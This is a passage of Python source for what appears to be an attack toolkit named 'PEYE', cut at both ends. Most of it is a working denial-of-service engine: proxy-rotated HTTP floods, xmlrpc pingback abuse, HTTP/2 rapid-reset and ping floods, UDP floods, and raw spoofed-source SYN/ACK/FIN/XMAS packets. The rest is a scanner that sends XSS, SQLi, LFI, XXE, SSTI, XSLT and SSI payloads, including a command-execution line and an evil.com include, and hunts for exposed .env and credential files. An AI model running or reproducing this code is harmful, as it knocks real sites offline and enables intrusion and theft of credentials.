            bypass_payloads = ['../', '..;/', '..%2f', '..%252f', '%2e%2e%2f']
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                payload = random.choice(bypass_payloads)
                url = self.target + payload
                url = self._add_saa(url)
                session.get(url, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _xmlrpc_worker(self, end_time):
        xml_payload = """<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>{}</string></value></param></params></methodCall>"""
        session = requests.Session()
        session.verify = False
        xmlrpc_url = urljoin(self.target, 'xmlrpc.php')
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                session.post(xmlrpc_url, data=xml_payload.format(self.target), timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _h2_get_worker(self, end_time):
        if not H2_AVAILABLE:
            self.stats.add(False)
            return
        try:
            import h2.connection
            import h2.config
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.host, 443))
            sock = ssl.wrap_socket(sock, server_hostname=self.host)
            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.send(conn.data_to_send())
            while self.running and time.time() < end_time:
                conn.send_headers(1, [(':method', 'GET'), (':path', self.path), (':scheme', 'https'), (':authority', self.host)])
                conn.send_data(1, b'')
                sock.send(conn.data_to_send())
                self.stats.add(True)
            sock.close()
        except:
            self.stats.add(False)
    
    def _h2_post_worker(self, end_time):
        if not H2_AVAILABLE:
            self.stats.add(False)
            return
        try:
            import h2.connection
            import h2.config
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.host, 443))
            sock = ssl.wrap_socket(sock, server_hostname=self.host)
            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.send(conn.data_to_send())
            while self.running and time.time() < end_time:
                conn.send_headers(1, [(':method', 'POST'), (':path', self.path), (':scheme', 'https'), (':authority', self.host)])
                conn.send_data(1, b'x' * 1000)
                sock.send(conn.data_to_send())
                self.stats.add(True)
            sock.close()
        except:
            self.stats.add(False)
    
    def _h2_rapid_worker(self, end_time):
        if not H2_AVAILABLE:
            self.stats.add(False)
            return
        try:
            import h2.connection
            import h2.config
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.host, 443))
            sock = ssl.wrap_socket(sock, server_hostname=self.host)
            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.send(conn.data_to_send())
            stream_id = 1
            while self.running and time.time() < end_time:
                conn.send_headers(stream_id, [(':method', 'GET'), (':path', self.path), (':scheme', 'https'), (':authority', self.host)])
                conn.send_data(stream_id, b'')
                conn.reset_stream(stream_id)
                sock.send(conn.data_to_send())
                stream_id += 2
                self.stats.add(True)
            sock.close()
        except:
            self.stats.add(False)
    
    def _h2_ping_worker(self, end_time):
        if not H2_AVAILABLE:
            self.stats.add(False)
            return
        try:
            import h2.connection
            import h2.config
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.host, 443))
            sock = ssl.wrap_socket(sock, server_hostname=self.host)
            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.send(conn.data_to_send())
            while self.running and time.time() < end_time:
                conn.ping(b'\x00' * 8)
                sock.send(conn.data_to_send())
                self.stats.add(True)
            sock.close()
        except:
            self.stats.add(False)
    
    def _tcp_worker(self, end_time):
        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.host, self.port))
                sock.send(b'X' * 1024)
                sock.close()
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _udp_worker(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running and time.time() < end_time:
                sock.sendto(b'X' * 64000, (self.host, self.port))
                self.stats.add(True)
        except:
            self.stats.add(False)
    
    def _create_tcp_packet(self, flags):
        # Simplified packet creation
        return b''
    
    def _syn_worker(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while self.running and time.time() < end_time:
                packet = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, 2, 0, socket.inet_aton('1.1.1.1'), socket.inet_aton(self.host))
                sock.sendto(packet, (self.host, self.port))
                self.stats.add(True)
        except:
            self.stats.add(False)
    
    def _ack_worker(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            while self.running and time.time() < end_time:
                packet = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, 16, 0, socket.inet_aton('1.1.1.1'), socket.inet_aton(self.host))
                sock.sendto(packet, (self.host, self.port))
                self.stats.add(True)
        except:
            self.stats.add(False)
    
    def _fin_worker(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            while self.running and time.time() < end_time:
                packet = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, 1, 0, socket.inet_aton('1.1.1.1'), socket.inet_aton(self.host))
                sock.sendto(packet, (self.host, self.port))
                self.stats.add(True)
        except:
            self.stats.add(False)
    
    def _rst_worker(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            while self.running and time.time() < end_time:
                packet = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, 4, 0, socket.inet_aton('1.1.1.1'), socket.inet_aton(self.host))
                sock.sendto(packet, (self.host, self.port))
                self.stats.add(True)
        except:
            self.stats.add(False)
    
    def _xmas_worker(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            while self.running and time.time() < end_time:
                packet = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, 41, 0, socket.inet_aton('1.1.1.1'), socket.inet_aton(self.host))
                sock.sendto(packet, (self.host, self.port))
                self.stats.add(True)
        except:
            self.stats.add(False)
    
    def _null_worker(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            while self.running and time.time() < end_time:
                packet = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, 0, 0, socket.inet_aton('1.1.1.1'), socket.inet_aton(self.host))
                sock.sendto(packet, (self.host, self.port))
                self.stats.add(True)
        except:
            self.stats.add(False)
    
    def _mixed_worker(self, end_time):
        methods = ['GET', 'POST', 'HEAD', 'DELETE', 'PUT', 'PATCH', 'OPTIONS']
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                method = random.choice(methods)
                url = self._add_saa(self.target)
                session.request(method, url, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _attack(self, name, duration, threads, worker_func):
        print(f"\n{RED}[!] {name} | {self.target}{RESET}")
        print(f"{YELLOW}[*] Duration: {duration}s | Threads: {threads} | Proxy: {'ON' if self.use_proxy else 'OFF'}{RESET}\n")
        
        self.running = True
        self.stats = Stats()
        start = time.time()
        end = start + duration
        
        for i in range(threads):
            threading.Thread(target=worker_func, args=(end,), daemon=True).start()
        
        try:
            while time.time() < end:
                time.sleep(2)
                e = time.time() - start
                rps = self.stats.total / e if e > 0 else 0
                print(f"\r{WHITE}[{CYAN}*{WHITE}] {YELLOW}Req: {self.stats.total:,} | {BLUE}RPS: {rps:.0f}{RESET}", end='', flush=True)
        except KeyboardInterrupt:
            self.running = False
        
        self.running = False
        time.sleep(1)
        e = time.time() - start
        rps = self.stats.total / e if e > 0 else 0
        print(f"\n\n{GREEN}[✓] {self.stats.total:,} req | RPS: {rps:.0f} | {e:.1f}s{RESET}\n")

class VulnerabilityReport:
    def __init__(self):
        self.findings = []
        self.target = ""
        self.scan_time = ""
    
    def add(self, vuln_type, url, payload, status, detail=""):
        self.findings.append({
            'type': vuln_type,
            'url': url,
            'payload': payload,
            'status': status,
            'detail': detail,
            'time': datetime.now().strftime("%H:%M:%S")
        })
    
    def display(self):
        if not self.findings:
            return
        
        print(f"\n{RED}{'='*70}{RESET}")
        print(f"{YELLOW}[!] VULNERABILITIES FOUND!{RESET}")
        print(f"{RED}{'='*70}{RESET}")
        
        for i, vuln in enumerate(self.findings, 1):
            print(f"\n{CYAN}[{i}] {RED}{vuln['type']} VULNERABILITY{RESET}")
            print(f"    {WHITE}URL:{RESET} {vuln['url']}")
            print(f"    {WHITE}Payload:{RESET} {YELLOW}{vuln['payload'][:100]}{RESET}")
            print(f"    {WHITE}Status:{RESET} {GREEN}{vuln['status']}{RESET}")
            if vuln['detail']:
                print(f"    {WHITE}Detail:{RESET} {vuln['detail']}")
            print(f"    {WHITE}Time:{RESET} {vuln['time']}")
        
        print(f"\n{RED}{'='*70}{RESET}")
        print(f"{YELLOW}[!] Total: {len(self.findings)} vulnerabilities found{RESET}")
        print(f"{RED}{'='*70}{RESET}")
        
        filename = f"vuln_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(f"PEYE Vulnerability Report\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*70}\n\n")
            for vuln in self.findings:
                f.write(f"[{vuln['type']}] {vuln['url']}\n")
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"Status: {vuln['status']}\n\n")
        print(f"{GREEN}[✓] Report saved to: {filename}{RESET}")

class AdvancedScanner:
    def __init__(self, target, session):
        self.target = target
        self.session = session
        self.wordlists = WordlistManager()
        self.results = defaultdict(list)
        self.report = VulnerabilityReport()
        self.report.target = target
        self.report.scan_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.threads = 50
    
    def check_connection(self, url):
        try:
            resp = self.session.get(url, timeout=5)
            if resp.status_code == 200:
                return True, resp.status_code
            elif resp.status_code == 403:
                print(f"{RED}[✗] Access Denied (403 Forbidden) - Cannot scan{RESET}")
                return False, 403
            elif resp.status_code == 404:
                print(f"{RED}[✗] Not Found (404) - Target tidak ditemukan{RESET}")
                return False, 404
            else:
                return False, resp.status_code
        except:
            return False, None
    
    def vuln_scan(self, vuln_type, payloads, param='q', indicator=None, method='GET'):
        if not payloads:
            print(f"{YELLOW}[!] No {vuln_type} payloads loaded{RESET}")
            return []
        
        print(f"\n{CYAN}[*] Scanning {vuln_type}... (Total: {len(payloads)}){RESET}")
        
        connected, status = self.check_connection(self.target)
        if not connected:
            if status == 404:
                print(f"{RED}[✗] Target Not Found (404){RESET}")
            return []
        
        found = []
        total = len(payloads)
        
        def test_payload(payload):
            if method.upper() == 'GET':
                test_url = self.target + (('?' + param + '=' + quote(payload)) if '?' not in self.target else ('&' + param + '=' + quote(payload)))
                try:
                    resp = self.session.get(test_url, timeout=5)
                    if resp.status_code == 200:
                        if indicator and indicator in resp.text:
                            return (payload, test_url, resp.status_code, resp.text[:200])
                    return None
                except:
                    return None
            else:
                test_url = self.target
                try:
                    resp = self.session.post(test_url, data={param: payload}, timeout=5)
                    if resp.status_code == 200:
                        if indicator and indicator in resp.text:
                            return (payload, test_url, resp.status_code, resp.text[:200])
                    return None
                except:
                    return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_payload, p): p for p in payloads}
            for i, future in enumerate(as_completed(futures), 1):
                result = future.result()
                if result:
                    payload, test_url, status_code, detail = result
                    found.append(payload)
                    self.report.add(vuln_type, test_url, payload, f"HTTP {status_code}", detail[:100])
                    print(f"\n{RED}[!] {vuln_type} VULNERABLE!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {test_url}")
                    print(f"    {WHITE}Payload:{RESET} {YELLOW}{payload[:80]}{RESET}")
                    print(f"    {WHITE}Status:{RESET} {GREEN}HTTP {status_code}{RESET}")
                
                if i % 50 == 0 and total > 0:
                    print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
        
        print(f"\n{GREEN}[✓] {vuln_type} complete: {len(found)}/{total} found{RESET}")
        self.results[vuln_type] = found
        return found
    
    def scan_csrf(self):
        print(f"\n{CYAN}[*] Scanning CSRF Vulnerability...{RESET}")
        payloads = self.wordlists.get('csrf')
        found = []
        
        for payload in payloads:
            try:
                resp = self.session.get(self.target, timeout=5)
                if resp.status_code == 200:
                    if payload in resp.text.lower():
                        print(f"{RED}[!] CSRF Possible: {self.target}{RESET}")
                        self.report.add("CSRF", self.target, payload, "Potential", "")
                        found.append(payload)
            except:
                pass
        
        print(f"{GREEN}[✓] CSRF scan complete: {len(found)} found{RESET}")
        return found
    
    def scan_cors(self):
        print(f"\n{CYAN}[*] Scanning CORS Misconfiguration...{RESET}")
        origins = self.wordlists.get('cors')
        found = []
        
        for origin in origins:
            try:
                headers = {'Origin': origin}
                resp = self.session.get(self.target, headers=headers, timeout=5)
                if resp.headers.get('Access-Control-Allow-Origin') == origin or resp.headers.get('Access-Control-Allow-Origin') == '*':
                    print(f"{RED}[!] CORS Misconfiguration: ACAO: {origin}{RESET}")
                    self.report.add("CORS", self.target, origin, "Misconfigured", "")
                    found.append(origin)
            except:
                pass
        
        print(f"{GREEN}[✓] CORS scan complete: {len(found)} found{RESET}")
        return found
    
    def scan_clickjacking(self):
        print(f"\n{CYAN}[*] Scanning Clickjacking Vulnerability...{RESET}")
        try:
            resp = self.session.get(self.target, timeout=5)
            if resp.status_code == 200:
                if 'X-Frame-Options' not in resp.headers:
                    print(f"{RED}[!] Clickjacking Possible - No X-Frame-Options header{RESET}")
                    self.report.add("Clickjacking", self.target, "", "Missing X-Frame-Options", "")
                elif resp.headers.get('X-Frame-Options') == 'ALLOWALL':
                    print(f"{RED}[!] Clickjacking Possible - X-Frame-Options: ALLOWALL{RESET}")
                    self.report.add("Clickjacking", self.target, "", "X-Frame-Options: ALLOWALL", "")
                else:
                    print(f"{GREEN}[✓] X-Frame-Options present: {resp.headers.get('X-Frame-Options')}{RESET}")
        except:
            pass
        
        print(f"{GREEN}[✓] Clickjacking scan complete{RESET}")
    
    def scan_opendir(self):
        print(f"\n{CYAN}[*] Scanning Open Directory...{RESET}")
        paths = self.wordlists.get('opendir')
        found = []
        
        for path in paths:
            url = urljoin(self.target, path)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    if 'Index of' in resp.text or 'Parent Directory' in resp.text:
                        print(f"{RED}[!] Open Directory Found: {url}{RESET}")
                        self.report.add("Open Directory", url, "", "HTTP 200", "")
                        found.append(url)
            except:
                pass
        
        print(f"{GREEN}[✓] Open Directory scan complete: {len(found)} found{RESET}")
        return found
    
    def scan_backup(self):
        print(f"\n{CYAN}[*] Scanning Backup Files...{RESET}")
        files = self.wordlists.get('backup')
        found = []
        
        for file in files:
            url = urljoin(self.target, file)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    print(f"{RED}[!] Backup File Found: {url}{RESET}")
                    self.report.add("Backup File", url, "", "HTTP 200", "")
                    found.append(url)
            except:
                pass
        
        print(f"{GREEN}[✓] Backup scan complete: {len(found)} found{RESET}")
        return found
    
    def scan_config(self):
        print(f"\n{CYAN}[*] Scanning Config Files...{RESET}")
        files = self.wordlists.get('config')
        found = []
        
        for file in files:
            url = urljoin(self.target, file)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    if 'password' in resp.text.lower() or 'api_key' in resp.text.lower():
                        print(f"{RED}[!] Config File Found: {url}{RESET}")
                        self.report.add("Config File", url, "", "HTTP 200", "Contains sensitive data")
                        found.append(url)
            except:
                pass
        
        print(f"{GREEN}[✓] Config scan complete: {len(found)} found{RESET}")
        return found
    
    def scan_env(self):
        print(f"\n{CYAN}[*] Scanning .env Files...{RESET}")
        files = self.wordlists.get('env')
        found = []
        
        for file in files:
            url = urljoin(self.target, file)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    if 'DB_' in resp.text or 'APP_KEY' in resp.text or 'PASSWORD' in resp.text:
                        print(f"{RED}[!] .env File Found: {url}{RESET}")
                        self.report.add(".env File", url, "", "HTTP 200", "Contains credentials")
                        found.append(url)
            except:
                pass
        
        print(f"{GREEN}[✓] .env scan complete: {len(found)} found{RESET}")
        return found
    
    def scan_parameters(self):
        print(f"\n{CYAN}[*] Scanning Parameters...{RESET}")
        params = self.wordlists.get('parameters')
        if not params:
            params = ['id', 'q', 'page', 'file', 'dir', 'path', 'url', 'redirect', 'return', 'next']
        found = []
        
        for param in params:
            test_url = self.target + (('?' + param + '=test') if '?' not in self.target else ('&' + param + '=test'))
            try:
                resp1 = self.session.get(self.target, timeout=3)
                resp2 = self.session.get(test_url, timeout=3)
                if len(resp2.content) != len(resp1.content):
                    print(f"{GREEN}[✓] Parameter Found: {param}{RESET}")
                    found.append(param)
            except:
                pass
        
        print(f"{GREEN}[✓] Parameter scan complete: {len(found)} found{RESET}")
        return found
    
    def scan_endpoints(self):
        print(f"\n{CYAN}[*] Scanning Endpoints...{RESET}")
        endpoints = self.wordlists.get('endpoints')
        if not endpoints:
            endpoints = ['api', 'v1', 'v2', 'admin', 'user', 'login', 'register', 'upload', 'download']
        found = []
        
        for endpoint in endpoints:
            url = urljoin(self.target, endpoint)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    print(f"{GREEN}[✓] Endpoint Found: {url}{RESET}")
                    self.report.add("Endpoint", url, "", "HTTP 200", "")
                    found.append(url)
            except:
                pass
        
        print(f"{GREEN}[✓] Endpoint scan complete: {len(found)} found{RESET}")
        return found
    
    def dir_scan(self):
        dirs = self.wordlists.get('dirs')
        if not dirs:
            dirs = ['admin', 'login', 'wp-admin', 'administrator', 'cpanel', 'dashboard', 'phpmyadmin', 'backup', 'config', 'api']
            print(f"{YELLOW}[!] No dirs.txt, using internal list{RESET}")
        
        print(f"\n{CYAN}[*] Directory Bruteforce... (Total: {len(dirs)}){RESET}")
        
        connected, status = self.check_connection(self.target)
        if not connected:
            print(f"{RED}[✗] Cannot scan directories{RESET}")
            return []
        
        found = []
        total = len(dirs)
        
        def check_dir(d):
            url = urljoin(self.target, d)
            try:
                resp = self.session.get(url, timeout=3, allow_redirects=False)
                if resp.status_code == 200:
                    return (url, resp.status_code, resp.headers.get('Content-Length', '?'))
                return None
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(check_dir, d): d for d in dirs}
            for i, future in enumerate(as_completed(futures), 1):
                result = future.result()
                if result:
                    url, code, size = result
                    found.append(url)
                    print(f"\n{GREEN}[✓] DIRECTORY FOUND!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {url}")
                    print(f"    {WHITE}Status:{RESET} {GREEN}HTTP {code} ({size} bytes){RESET}")
                    self.report.add("Directory", url, "", f"HTTP {code}", f"Size: {size} bytes")
                
                if i % 50 == 0:
                    print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
        
        print(f"\n{GREEN}[✓] Directory scan complete: {len(found)}/{total} found{RESET}")
        return found
    
    def subdomain_scan(self, domain):
        subs = self.wordlists.get('subdomains')
        if not subs:
            subs = ['www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'api', 'test', 'vpn', 'cpanel', 'webmail', 'ns1', 'ns2']
            print(f"{YELLOW}[!] No subdomains.txt, using internal list{RESET}")
        
        print(f"\n{CYAN}[*] Subdomain Scan... (Total: {len(subs)}){RESET}")
        found = []
        total = len(subs)
        
        def check_sub(sub):
            url = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(url)
                return (url, ip)
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(check_sub, s): s for s in subs}
            for i, future in enumerate(as_completed(futures), 1):
                result = future.result()
                if result:
                    url, ip = result
                    found.append(url)
                    print(f"\n{GREEN}[✓] SUBDOMAIN FOUND!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {url}")
                    print(f"    {WHITE}IP:{RESET} {ip}")
                    self.report.add("Subdomain", url, "", f"IP: {ip}", "")
                
                if i % 50 == 0:
                    print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
        
        print(f"\n{GREEN}[✓] Subdomain scan complete: {len(found)}/{total} found{RESET}")
        return found
    
    def bypass403_scan(self):
        payloads = self.wordlists.get('bypass403')
        if not payloads:
            payloads = ['/', '/%2e/', '/%2e%2e/', '/..;/', '/%252e%252e%252f']
            print(f"{YELLOW}[!] No bypass403.txt, using internal list{RESET}")
        
        print(f"\n{CYAN}[*] Scanning 403 Bypass... (Total: {len(payloads)}){RESET}")
        found = []
        
        def test_bypass(payload):
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                'X-Forwarded-For': '127.0.0.1',
                'X-Original-URL': payload,
                'X-Rewrite-URL': payload,
                'X-Forwarded-Host': 'localhost'
            }
            try:
                resp = self.session.get(self.target + payload, headers=headers, timeout=5)
                if resp.status_code == 200:
                    return (payload, self.target + payload, resp.status_code)
                return None
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_bypass, p): p for p in payloads}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    payload, url, code = result
                    found.append(payload)
                    self.report.add("403 Bypass", url, payload, f"HTTP {code}", "")
                    print(f"\n{GREEN}[✓] 403 BYPASS FOUND!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {url}")
                    print(f"    {WHITE}Technique:{RESET} {YELLOW}{payload}{RESET}")
        
        print(f"{GREEN}[✓] 403 Bypass complete: {len(found)} found{RESET}")
        return found
    
    def ssti_scan(self):
        payloads = self.wordlists.get('ssti')
        if not payloads:
            payloads = ['{{7*7}}', '${7*7}', '{{7*7}}', '{{config}}', '{{self.__class__}}']
            print(f"{YELLOW}[!] No ssti.txt, using internal list{RESET}")
        
        print(f"\n{CYAN}[*] Scanning SSTI... (Total: {len(payloads)}){RESET}")
        found = []
        
        def test_ssti(payload):
            test_url = self.target + (('?' + 'name' + '=' + quote(payload)) if '?' not in self.target else ('&' + 'name' + '=' + quote(payload)))
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200:
                    indicators = ['{{', '}}', '${', '49', '77']
                    for ind in indicators:
                        if ind in resp.text:
                            return (payload, test_url, resp.status_code)
                return None
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_ssti, p): p for p in payloads}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    payload, url, code = result
                    found.append(payload)
                    self.report.add("SSTI", url, payload, f"HTTP {code}", "")
                    print(f"\n{RED}[!] SSTI VULNERABLE!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {url}")
                    print(f"    {WHITE}Payload:{RESET} {YELLOW}{payload[:80]}{RESET}")
        
        print(f"{GREEN}[✓] SSTI complete: {len(found)} found{RESET}")
        return found
    
    def xslt_scan(self):
        payloads = self.wordlists.get('xslt')
        if not payloads:
            payloads = ['<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document(\'/etc/passwd\')"/></xsl:template></xsl:stylesheet>']
            print(f"{YELLOW}[!] No xslt.txt, using internal list{RESET}")
        
        print(f"\n{CYAN}[*] Scanning XSLT Injection... (Total: {len(payloads)}){RESET}")
        found = []
        
        def test_xslt(payload):
            test_url = self.target + (('?' + 'xml' + '=' + quote(payload)) if '?' not in self.target else ('&' + 'xml' + '=' + quote(payload)))
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200:
                    if 'xsl:stylesheet' in resp.text or 'file://' in resp.text:
                        return (payload, test_url, resp.status_code)
                return None
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_xslt, p): p for p in payloads}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    payload, url, code = result
                    found.append(payload)
                    self.report.add("XSLT Injection", url, payload, f"HTTP {code}", "")
                    print(f"\n{RED}[!] XSLT INJECTION VULNERABLE!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {url}")
        
        print(f"{GREEN}[✓] XSLT complete: {len(found)} found{RESET}")
        return found
    
    def ssi_esi_scan(self):
        payloads = self.wordlists.get('ssi_esi')
        if not payloads:
            payloads = ['<!--#exec cmd="ls" -->', '<!--#include file="../../etc/passwd"-->', '<esi:include src="http://evil.com"/>']
            print(f"{YELLOW}[!] No ssi_esi.txt, using internal list{RESET}")
        
        print(f"\n{CYAN}[*] Scanning SSI/ESI Injection... (Total: {len(payloads)}){RESET}")
        found = []
        
        def test_ssi(payload):
            test_url = self.target + (('?' + 'page' + '=' + quote(payload)) if '?' not in self.target else ('&' + 'page' + '=' + quote(payload)))
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200:
                    indicators = ['<!--#', 'root:', 'uid=', 'bin/']
                    for ind in indicators:
                        if ind in resp.text:
                            return (payload, test_url, resp.status_code)
                return None
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_ssi, p): p for p in payloads}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    payload, url, code = result
                    found.append(payload)
                    self.report.add("SSI/ESI Injection", url, payload, f"HTTP {code}", "")
                    print(f"\n{RED}[!] SSI/ESI INJECTION VULNERABLE!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {url}")
        
        print(f"{GREEN}[✓] SSI/ESI complete: {len(found)} found{RESET}")
        return found
    
    def full_scan(self):
        print(f"\n{MAGENTA}{'='*70}{RESET}")
        print(f"{YELLOW}[*] FULL SCAN: {self.target}{RESET}")
        print(f"{MAGENTA}{'='*70}{RESET}")
        
        connected, status = self.check_connection(self.target)
        if not connected:
            if status == 404:
                print(f"{RED}[✗] Target Not Found (404) - Aborting scan{RESET}")
            else:
                print(f"{RED}[✗] Target unreachable, aborting scan{RESET}")
            return
        
        self.vuln_scan('XSS', self.wordlists.get('xss'), 'q', '<script>')
        self.vuln_scan('SQLi', self.wordlists.get('sqli'), 'id', 'mysql|syntax')
        self.vuln_scan('LFI', self.wordlists.get('lfi'), 'file', 'root:')
        self.vuln_scan('XXE', self.wordlists.get('xxe'), 'xml', 'root:', method='POST')
        self.bypass403_scan()
        self.ssti_scan()
        self.xslt_scan()
        self.ssi_esi_scan()
        self.scan_csrf()
        self.scan_cors()
        self.scan_clickjacking()
        self.scan_opendir()
        self.scan_backup()
        self.scan_config()
        self.scan_env()
        self.scan_parameters()
        self.scan_endpoints()
        self.dir_scan()
        
        print(f"\n{MAGENTA}{'='*70}{RESET}")
        print(f"{YELLOW}[*] SCAN SUMMARY{RESET}")
        print(f"{MAGENTA}{'='*70}{RESET}")
        total = 0
        for vuln, findings in self.results.items():
            if findings:
                print(f"{RED}[!] {vuln}: {len(findings)} vulnerabilities{RESET}")
                total += len(findings)
        if total == 0:
            print(f"{GREEN}[✓] No vulnerabilities detected{RESET}")
        
        self.report.display()
        print(f"{MAGENTA}{'='*70}{RESET}")
        return self.results

class IPInfo:
    def __init__(self):
        self.session = requests.Session()
    
    def get_ip_info(self, target):
        print(f"{CYAN}[*] Getting IP information for {target}...{RESET}")
        try:
            ip = socket.gethostbyname(target)
            print(f"{GREEN}[✓] IP Address: {ip}{RESET}")
            
            try:
                geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
                if geo.get('status') == 'success':
                    print(f"{GREEN}[✓] Location: {geo.get('city')}, {geo.get('regionName')}, {geo.get('country')}{RESET}")
                    print(f"{GREEN}[✓] ISP: {geo.get('isp')}{RESET}")
            except:
                pass
            return ip
        except:
            print(f"{RED}[✗] Could not resolve IP{RESET}")
            return None

class PortScanner:
    def __init__(self):
        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 3389, 8080, 8443]
    
    def scan(self, target, ports=None):
        print(f"{CYAN}[*] Scanning ports on {target}...{RESET}")
        ports = ports or self.common_ports
        open_ports = []
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                    print(f"{GREEN}[✓] Port {port} OPEN{RESET}")
                sock.close()
            except:
                pass
        
        print(f"{GREEN}[✓] Found {len(open_ports)} open ports{RESET}")
        return open_ports

class CMSDetector:
    def __init__(self, target, session):
        self.target = target
        self.session = session
    
    def detect(self):
        print(f"{CYAN}[*] Detecting CMS...{RESET}")
        cms_list = {
            'WordPress': ['wp-content', 'wp-includes'],
            'Joomla': ['joomla', 'com_content'],
            'Laravel': ['laravel', 'csrf-token'],
            'Drupal': ['drupal', 'sites/default']
        }
        
        try:
            resp = self.session.get(self.target, timeout=10)
            html = resp.text.lower()
            
            for cms, patterns in cms_list.items():
                for pattern in patterns:
                    if pattern.lower() in html:
                        print(f"{GREEN}[✓] CMS Detected: {cms}{RESET}")
                        return cms
            
            print(f"{YELLOW}[!] No CMS detected{RESET}")
            return None
        except:
            print(f"{RED}[✗] Could not detect CMS{RESET}")
            return None

class Peye:
    def __init__(self):
